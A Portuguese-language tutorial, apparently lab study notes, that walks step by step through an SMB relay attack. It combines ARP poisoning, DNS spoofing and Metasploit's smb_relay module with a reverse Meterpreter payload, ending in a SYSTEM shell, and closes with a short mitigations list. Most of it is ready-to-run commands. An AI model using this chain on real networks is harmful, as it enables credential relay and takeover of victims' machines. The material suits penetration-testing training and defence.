## SMB Relay com DNS Spoof + ARP MiTM (Metasploit)

Este cenário combina:

- DNS spoofing
- ARP poisoning (MiTM)
- SMB Relay
- execução remota via Metasploit

Ferramentas envolvidas:

- Metasploit Framework
- dnsspoof
- arpspoof

---

# Visão do ataque

Victim → DNS query  
        ↓  
Attacker responde (DNS spoof)  
        ↓  
Victim conecta SMB ao attacker  
        ↓  
Metasploit captura NTLM  
        ↓  
Relay para alvo real  
        ↓  
Shell meterpreter

---

# Pré-requisitos

- Mesma rede local
- SMB signing desativado
- Credenciais iguais em múltiplos hosts
- NTLM habilitado

---

# Step 1 — Configurar SMB Relay no Metasploit

msfconsole  
use exploit/windows/smb/smb_relay  
set SRVHOST 172.16.5.101  
set PAYLOAD windows/meterpreter/reverse_tcp  
set LHOST 172.16.5.101  
set SMBHOST 172.16.5.10  
exploit

Explicação:

|Parâmetro|Função|
|---|---|
|SRVHOST|IP do atacante|
|LHOST|callback do meterpreter|
|SMBHOST|alvo final do relay|
|PAYLOAD|shell reverso|

Agora o Metasploit fica **escutando conexões SMB**.

---

# Step 2 — DNS Spoof

Criar arquivo de redirecionamento:

echo "172.16.5.101 *.sportsfoo.com" > dns

Executar:

dnsspoof -i eth1 -f dns

Função:

- qualquer `*.sportsfoo.com`
- resolve para o atacante

---

# Step 3 — Ativar IP Forwarding

echo 1 > /proc/sys/net/ipv4/ip_forward

Necessário para manter tráfego fluindo no MiTM.

---

# Step 4 — ARP Spoof (MiTM)

Terminal 1:

arpspoof -i eth1 -t 172.16.5.5 172.16.5.1

Terminal 2:

arpspoof -i eth1 -t 172.16.5.1 172.16.5.5

Onde:

- 172.16.5.5 = vítima
- 172.16.5.1 = gateway

Agora você está **no meio da comunicação**.

---

# Step 5 — O que acontece

Exemplo:

Vítima tenta acessar:

\\fileserver.sportsfoo.com\AnyShare

Fluxo:

Victim → DNS request  
Attacker → responde 172.16.5.101  
Victim → conecta SMB ao attacker  
Metasploit → captura NTLM  
Metasploit → relay para 172.16.5.10

---

# Step 6 — Shell obtido

Metasploit mostra:

Meterpreter session 1 opened

---

# Step 7 — Interagir com sessão

sessions  
sessions -i 1  
getuid

Resultado esperado:

NT AUTHORITY\SYSTEM

---

# Fluxo completo

ARP spoof  
   ↓  
DNS spoof  
   ↓  
Victim SMB connection  
   ↓  
Metasploit captura NTLM  
   ↓  
Relay para alvo  
   ↓  
Meterpreter shell

---

# Por que funciona

- domínio interno usa DNS
- vítima autentica automaticamente via NTLM
- relay reutiliza credenciais
- alvo aceita autenticação

---

# Classificação

|Etapa|Tipo|
|---|---|
|ARP Spoof|Network-based|
|DNS Spoof|Network-based|
|SMB Relay|Network-based|
|Meterpreter|Lateral movement|

---

# Indicadores de sucesso

Você verá:

SMB Relay attack successful  
Meterpreter session opened

---

# Mitigações (defesa)

- Ativar SMB signing
- Desabilitar LLMNR / NBNS
- Forçar Kerberos
- Usar segmentação de rede